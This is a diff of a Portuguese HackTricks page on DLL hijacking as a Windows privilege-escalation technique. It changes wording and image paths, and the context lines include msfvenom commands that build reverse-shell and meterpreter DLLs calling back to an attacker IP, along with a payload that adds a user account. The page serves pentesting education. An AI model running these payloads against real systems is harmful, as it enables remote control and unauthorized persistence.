@@ -12,7 +12,7 @@
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 Se você está interessado em uma **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).
 
@@ -20,9 +20,9 @@ Se você está interessado em uma **carreira de hacking** e hackear o inquebráv
 
 ## Definição
 
-Primeiro de tudo, vamos entender a definição. O Dll hijacking é, no sentido mais amplo, **enganar um aplicativo legítimo/confiável para carregar uma DLL arbitrária**. Termos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ e _DLL Side-Loading_ são frequentemente - erroneamente - usados para dizer a mesma coisa.
+Primeiro de tudo, vamos entender a definição. O DLL hijacking é, no sentido mais amplo, **enganar um aplicativo legítimo/confiável para carregar um DLL arbitrário**. Termos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ e _DLL Side-Loading_ são frequentemente - erroneamente - usados para dizer a mesma coisa.
 
-O Dll hijacking pode ser usado para **executar** código, obter **persistência** e **elevar privilégios**. Dos três, o **menos provável** de encontrar é a **elevação de privilégios** de longe. No entanto, como isso faz parte da seção de elevação de privilégios, vou focar nessa opção. Além disso, observe que, independentemente do objetivo, um dll hijacking é realizado da mesma maneira.
+O DLL hijacking pode ser usado para **executar** código, obter **persistência** e **elevar privilégios**. Dos três, o **menos provável** de encontrar é a **elevação de privilégios** de longe. No entanto, como isso faz parte da seção de elevação de privilégios, vou focar nessa opção. Além disso, observe que, independentemente do objetivo, um DLL hijacking é realizado da mesma maneira.
 
 ### Tipos
 
@@ -33,7 +33,7 @@ Existem **várias abordagens** para escolher, com o sucesso dependendo de como o
 3. **Hijacking de DLL fantasma**: colocar uma DLL maliciosa no lugar de uma DLL ausente/inexistente que um aplicativo legítimo tenta carregar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
 4. **Redirecionamento de DLL**: alterar o local em que a DLL é procurada, por exemplo, editando a variável de ambiente `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para incluir a pasta que contém a DLL maliciosa \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
 5. **Substituição de DLL WinSxS**: substituir a DLL legítima pela DLL maliciosa na pasta WinSxS relevante da DLL alvo. Frequentemente referido como DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
-6. **Hijacking de DLL de caminho relativo**: copiar (e opcionalmente renomear) o aplicativo legítimo para uma pasta gravável pelo usuário, ao lado da DLL maliciosa. Da maneira como é usado, tem semelhanças com a Execução de Proxy Binário (Assinado) \[[8](https://attack.mitre.org/techniques/T1218/)]. Uma variação disso é chamada de 'traga seu próprio LOLbin' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)], que traz o aplicativo legítimo com a DLL maliciosa (em vez de copiá-lo da localização legítima na máquina da vítima).
+6. **Hijacking de DLL de caminho relativo**: copiar (e opcionalmente renomear) o aplicativo legítimo para uma pasta gravável pelo usuário, ao lado da DLL maliciosa. Da maneira como isso é usado, tem semelhanças com a Execução de Proxy Binário (Assinado) \[[8](https://attack.mitre.org/techniques/T1218/)]. Uma variação disso é chamada de 'traga seu próprio LOLbin' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)], que é um tanto oximorônico, em que o aplicativo legítimo é trazido com a DLL maliciosa (em vez de copiado da localização legítima na máquina da vítima).
 
 ## Encontrando Dlls ausentes
 
@@ -141,7 +141,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Criar um usuário (não encontrei uma versão x64):**
+**Criar um usuário (x86 Não vi uma versão x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
@@ -228,7 +228,7 @@ break;
 return TRUE;
 }
 ```
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 Se você está interessado em uma **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).
 
@@ -238,7 +238,7 @@ Se você está interessado em uma **carreira de hacking** e hackear o inquebráv
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
